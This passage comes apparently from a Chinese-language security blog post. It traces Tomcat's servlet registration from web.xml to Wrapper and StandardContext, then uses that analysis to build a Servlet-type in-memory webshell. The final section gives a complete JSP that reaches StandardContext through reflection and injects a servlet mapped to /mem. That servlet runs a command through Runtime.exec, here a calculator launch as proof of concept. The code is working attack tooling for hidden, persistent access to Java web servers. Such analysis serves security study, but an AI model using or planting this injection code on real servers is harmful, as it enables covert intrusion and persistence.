+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105164142-zwehdvz.png" alt="image">​</p>
+<p>然后再走到 <code>wrapper.setServletClass(servlet.getServletClass());</code>​ 中</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105164325-bp35sch.png" alt="image">​</p>
+<p>这里把我们完整的class位置也赋值给了wrapper的servletclass</p>
+<p>然后把wrapper加到了StandardContext中（不知道StandardContext的重新看一下上面的Java框架）</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105164813-e3t0x1s.png" alt="image">​</p>
+<p>到这里其实就是我们前面所说的把解析后的web.xml里面的东西给了wrapper，然后创建了键值对，加上前面说的wrapper其实就是uri的映射桥梁，到这里也就完成我们对下面这一部份的路由注册</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105164647-1f7dp4f.png" alt="image">​</p>
+<p>那么接下来就是处理下面的部分了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Memshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/memshell<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在下面几行的代码中，是添加 Servlet 映射，将 url 和 servlet-name 进行绑定</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(var35.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, String&gt; entry = (Map.Entry)var35.next();</span><br><span class="line">            <span class="built_in">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105165216-8c85ndv.png" alt="image">​</p>
+<p>到这里也算是完成了全部的分析了</p>
+<p>以上其实并没有实现我们注册类（HelloServlet）的实例化，这就要涉及Java的懒加载模式（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43842093/article/details/120579636%EF%BC%89">https://blog.csdn.net/qq_43842093/article/details/120579636）</a></p>
+<h1 id="0x05-内存马的实现"><a href="#0x05-内存马的实现" class="headerlink" title="0x05 内存马的实现"></a>0x05 内存马的实现</h1><p>上面已经把相关的流程分析完了，该到实现的地步了</p>
+<p>在 src&#x2F;main&#x2F;webapp 下创建一个 servletshell.jsp</p>
+<p>这个Jsp主要有两部份，第一部份就是马子🐎，第二部分就是实现动态注册</p>
+<h2 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="[1] 写Webshell"></a>[1] 写Webshell</h2><p>这里直接把 HelloServlet Copy</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello MemShell!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后去写动态注册部分</p>
+<h2 id="2-动态注册"><a href="#2-动态注册" class="headerlink" title="[2] 动态注册"></a>[2] 动态注册</h2><p>前面的路由分析总结就是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line"><span class="comment">// 用 context 创建一个 Wrapper 对象（代表一个 Servlet 的容器对象）</span></span><br><span class="line"></span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line"><span class="comment">// 设置该 Wrapper 的名称，通常对应 Servlet 的名字</span></span><br><span class="line"></span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line"><span class="comment">// 设置该 Wrapper 对应的 Servlet 的类路径，用于实例化 Servlet</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.context.addChild(wrapper);</span><br><span class="line"><span class="comment">// 将创建的 Wrapper 添加到当前 Context（Servlet 容器）中，使其生效</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line"><span class="comment">// 将 URL 映射添加到 Context 中，指定哪个路径（entry.getKey()）映射到哪个 Servlet 名字（entry.getValue()）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们根据前面的架构图</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105170635-dx7vtsu.png" alt="image">​</p>
+<p>1.获取 StandardContext</p>
+<p>2.将 Wrapper 注册进 Context</p>
+<p>在获取StandardContext的时候，我们得用<code>request.getServletContext()</code>​去调用</p>
+<p>因为一开始我们访问url的时候是访问的 org.apache.catalina.core.ApplicationContextFacade</p>
+<p>ApplicationContext 是封装了一个 StandardContext 的实现，而StandardContext 是 org.apache.catalina.core.StandardContext 类</p>
+<p>当访问一个 URL 时，Tomcat 会通过 <code>ApplicationContextFacade</code>​ 访问到实际的 <code>StandardContext</code>​，进而处理请求</p>
+<p>这里简单调试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">System.out.println(servletContext);</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105172941-iycdpb6.png" alt="image">​</p>
+<p>所以我们可以通过反射去获取StandardContext</p>
+<p><img src="C:/Users/HeHansen/Desktop/assets/image-20250105174120-7o5z339.png" alt="image">​</p>
+<p>这里的 ApplicationContextFacade 是有两层封装的</p>
+<p>第一层封装：我们前面用 request 获取的 ServletContext 返回的是 ApplicationContextFacade 实例，它对外屏蔽了内部实现。</p>
+<p>私有字段context，通过反射先获取 ApplicationContext</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContextObj</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br></pre></td></tr></table></figure>
+
+<p>此时，<code>ApplicationContext</code>​ 实际上是 <code>org.apache.catalina.core.ApplicationContext</code>​ 的实例。</p>
+<p>然后 ApplicationContext 中还有个字段是 context ，这个字段指向的是 StandardContext 实例</p>
+<p>我们用反射再去获取一次</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContextObj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContextObj</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContextObj);</span><br></pre></td></tr></table></figure>
+
+<p> 到这里我们成功实现了 StandardContext 的获取</p>
+<p>接下来是将 Wrapper 注册进 Context</p>
+<p>我们这里可以直接把上面的抄下来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContextObj.createWrapper();<span class="comment">// 用 context 创建一个 Wrapper 对象（代表一个 Servlet 的容器对象）</span></span><br><span class="line">wrapper.setName(<span class="string">&quot;MemServlet&quot;</span>);<span class="comment">// 设置该 Wrapper 的名称，通常对应 Servlet 的名字</span></span><br><span class="line">wrapper.setServletClass(MemServlet.class.getName());<span class="comment">// 设置该 Wrapper 对应的 Servlet 的类路径，用于实例化 Servlet</span></span><br><span class="line">standardContextObj.addChild(wrapper);<span class="comment">// 将创建的 Wrapper 添加到当前 Context（Servlet 容器）中，使其生效</span></span><br><span class="line">standardContextObj.addServletMappingDecoded(<span class="string">&quot;/mem&quot;</span>,<span class="string">&quot;MemServlet&quot;</span>);<span class="comment">// 将 URL 映射添加到 Context 中，指定哪个路径（entry.getKey()）映射到哪个 Servlet 名字（entry.getValue()）</span></span><br></pre></td></tr></table></figure>
+
+<p>但是我们前面说了</p>
+<p>这个代码并没有实例化我们的Webshell</p>
+<p>所以我们还得加一行代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">MemServlet</span>());</span><br></pre></td></tr></table></figure>
+
+<p>所以最终</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: hehanzzz</span><br><span class="line">  Date: <span class="number">2025</span>/<span class="number">1</span>/<span class="number">5</span></span><br><span class="line">  Time: <span class="number">16</span>:<span class="number">59</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ServletMemShell&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello MemShell!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//实现动态加载</span></span><br><span class="line">    <span class="comment">//获取StandardContext</span></span><br><span class="line">    <span class="comment">// 获取 ServletContext 对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="comment">// 通过反射获取 ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContextObj</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射获取 StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContextObj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContextObj</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContextObj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将 Wrapper 注册进 Context</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContextObj.createWrapper();<span class="comment">// 用 context 创建一个 Wrapper 对象（代表一个 Servlet 的容器对象）</span></span><br><span class="line">    wrapper.setName(<span class="string">&quot;MemServlet&quot;</span>);<span class="comment">// 设置该 Wrapper 的名称，通常对应 Servlet 的名字</span></span><br><span class="line">    wrapper.setServletClass(MemServlet.class.getName());<span class="comment">// 设置该 Wrapper 对应的 Servlet 的类路径，用于实例化 Servlet</span></span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">MemServlet</span>());</span><br><span class="line">    standardContextObj.addChild(wrapper);<span class="comment">// 将创建的 Wrapper 添加到当前 Context（Servlet 容器）中，使其生效</span></span><br><span class="line">    standardContextObj.addServletMappingDecoded(<span class="string">&quot;/mem&quot;</span>,<span class="string">&quot;MemServlet&quot;</span>);<span class="comment">// 将 URL 映射添加到 Context 中，指定哪个路径（entry.getKey()）映射到哪个 Servlet 名字（entry.getValue()）</span></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也是成功了</p>
+
+        </div>
+    
+<!-- tags -->
+
+    <div class="post-meta">
+        标签：
+        
+            <a href="/tags/Java/"> / Java</a>
+        
+            <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"> / 内存马</a>
+        
+    </div>
+
+</div>
+                <div class="footer">
+    <span>Copyright © <script>document.write(new Date().getFullYear())</script> Hello Hehanzzz~</span>
+    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
+</div>
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
